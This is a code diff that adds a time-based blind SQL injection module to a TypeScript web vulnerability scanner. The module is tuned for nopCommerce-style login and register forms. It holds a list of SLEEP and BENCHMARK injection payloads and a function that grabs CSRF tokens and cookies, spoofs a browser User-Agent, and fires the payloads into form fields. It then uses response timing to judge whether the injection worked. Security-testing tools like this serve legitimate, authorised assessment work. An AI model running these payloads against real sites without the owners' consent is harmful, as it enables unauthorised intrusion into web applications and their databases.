@@ -61,6 +61,20 @@ const SQLI_PAYLOADS = [
   "1' WAITFOR DELAY '0:0:5'--",
 ];
 
+// Time-based blind SQLi payloads (prioritaires pour MySQL)
+const TIME_BASED_PAYLOADS = [
+  "' AND SLEEP(5)--",
+  "' AND SLEEP(5)#",
+  "\" AND SLEEP(5)--",
+  "1' AND SLEEP(5)--",
+  "admin' AND SLEEP(5)--",
+  "' OR SLEEP(5)--",
+  "') AND SLEEP(5)--",
+  "' AND (SELECT SLEEP(5))--",
+  "';SELECT SLEEP(5)--",
+  "' AND BENCHMARK(5000000,SHA1('test'))--",
+];
+
 // Patterns d'erreur SQL (база данных exposed)
 const SQL_ERROR_PATTERNS = [
   // MySQL
@@ -458,4 +472,179 @@ function isProperlyEscaped(original: string, reflected: string): boolean {
   const hasEncodedBrackets = reflected.includes('&lt;') || reflected.includes('&gt;');
 
   return hasEncodedQuotes || hasEncodedBrackets;
+}
+
+/**
+ * TIME-BASED BLIND SQL INJECTION SCANNER
+ * Version améliorée avec support nopCommerce et détection CSRF
+ */
+export async function scanTimeBasedSQLi(target: string): Promise<Vulnerability[]> {
+  const vulnerabilities: Vulnerability[] = [];
+
+  console.log('\n[SQLi-TIME] Starting Time-Based Blind SQL Injection scan...');
+
+  try {
+    const baseUrl = new URL(target);
+    const cheerio = await import('cheerio');
+
+    // Configuration des formulaires à tester (adaptée pour nopCommerce et autres CMS)
+    const formsToTest = [
+      {
+        url: `${baseUrl.origin}/login`,
+        method: 'POST',
+        fields: {
+          email: ['loginModel.Email', 'email', 'Email', 'username', 'Username'],
+          password: ['loginModel.Password', 'password', 'Password'],
+        }
+      },
+      {
+        url: `${baseUrl.origin}/register`,
+        method: 'POST',
+        fields: {
+          email: ['registerModel.Email', 'email', 'Email'],
+          password: ['registerModel.Password', 'password', 'Password'],
+        }
+      },
+    ];
+
+    for (const form of formsToTest) {
+      console.log(`   [TEST] Testing ${form.url}...`);
+
+      try {
+        // Récupérer la page pour obtenir le token CSRF et cookies
+        const pageResponse = await axios.get(form.url, {
+          timeout: 15000,
+          validateStatus: () => true,
+          headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+          },
+        });
+
+        if (pageResponse.status >= 400) {
+          console.log(`   [SKIP] ${form.url} returns ${pageResponse.status}`);
+          continue;
+        }
+
+        // Extraire le token CSRF
+        const $ = cheerio.load(pageResponse.data);
+        const csrfToken = $('input[name="__RequestVerificationToken"]').val() as string || '';
+
+        // Récupérer les cookies
+        let cookies = '';
+        if (pageResponse.headers['set-cookie']) {
+          cookies = pageResponse.headers['set-cookie'].map((c: string) => c.split(';')[0]).join('; ');
+        }
+
+        // Détecter les vrais noms de champs
+        let emailFieldName = form.fields.email[0];
+        let passwordFieldName = form.fields.password[0];
+
+        for (const name of form.fields.email) {
+          if ($(`input[name="${name}"]`).length > 0) {
+            emailFieldName = name;
+            break;
+          }
+        }
+
+        for (const name of form.fields.password) {
+          if ($(`input[name="${name}"]`).length > 0) {
+            passwordFieldName = name;
+            break;
+          }
+        }
+
+        console.log(`   [INFO] Form fields: ${emailFieldName}, ${passwordFieldName}`);
+        console.log(`   [INFO] CSRF: ${csrfToken ? 'Found' : 'None'}`);
+
+        // Mesurer le baseline
+        const baselineData: Record<string, string> = {};
+        if (csrfToken) baselineData['__RequestVerificationToken'] = csrfToken;
+        baselineData[emailFieldName] = 'test@test.com';
+        baselineData[passwordFieldName] = 'test123456';
+
+        const baselineStart = Date.now();
+        await axios.post(form.url, new URLSearchParams(baselineData).toString(), {
+          timeout: 15000,
+          validateStatus: () => true,
+          headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Cookie': cookies,
+            'Referer': form.url,
+          },
+        });
+        const baselineTime = Date.now() - baselineStart;
+        console.log(`   [INFO] Baseline: ${baselineTime}ms`);
+
+        // Tester les payloads
+        for (const payload of TIME_BASED_PAYLOADS.slice(0, 5)) {
+          try {
+            const testData: Record<string, string> = {};
+            if (csrfToken) testData['__RequestVerificationToken'] = csrfToken;
+            testData[emailFieldName] = payload;
+            testData[passwordFieldName] = 'test123456';
+
+            console.log(`   [PAYLOAD] ${payload.substring(0, 25)}...`);
+
+            const startTime = Date.now();
+            await axios.post(form.url, new URLSearchParams(testData).toString(), {
+              timeout: 25000,
+              validateStatus: () => true,
+              headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Cookie': cookies,
+                'Referer': form.url,
+              },
+            });
+            const responseTime = Date.now() - startTime;
+
+            console.log(`   [TIME] ${responseTime}ms (delay: ${responseTime - baselineTime}ms)`);
+
+            if (responseTime > baselineTime + 4000) {
+              console.log(`   [CRITICAL] TIME-BASED SQLi DETECTED!`);
+
+              vulnerabilities.push({
+                type: 'sqli',
+                severity: 'critical',
+                title: 'Time-Based Blind SQL Injection',
+                description: `The form at ${form.url} is vulnerable to time-based blind SQL injection. Response delayed by ${responseTime - baselineTime}ms when SLEEP(5) was injected.`,
+                location: form.url,
+                evidence: `Field: ${emailFieldName}\nPayload: ${payload}\nBaseline: ${baselineTime}ms\nWith payload: ${responseTime}ms\nDelay: ${responseTime - baselineTime}ms`,
+              });
+              break;
+            }
+
+          } catch (error: any) {
+            if (error.code === 'ECONNABORTED') {
+              console.log(`   [CRITICAL] TIMEOUT - Likely vulnerable!`);
+              vulnerabilities.push({
+                type: 'sqli',
+                severity: 'critical',
+                title: 'Time-Based Blind SQL Injection (Timeout)',
+                description: `Request timed out when testing ${form.url}, indicating SQL command execution.`,
+                location: form.url,
+                evidence: `Payload caused request timeout (>25 seconds)`,
+              });
+              break;
+            }
+          }
+
+          await sleep(300);
+        }
+
+        if (vulnerabilities.length > 0) break;
+
+      } catch (error: any) {
+        console.log(`   [ERROR] ${error.message}`);
+      }
+    }
+
+  } catch (error) {
+    console.error('   [ERROR] Time-based SQLi scan error:', error);
+  }
+
+  console.log(`   [OK] Time-based SQLi scan completed: ${vulnerabilities.length} vulnerabilities found`);
+  return vulnerabilities;
 }
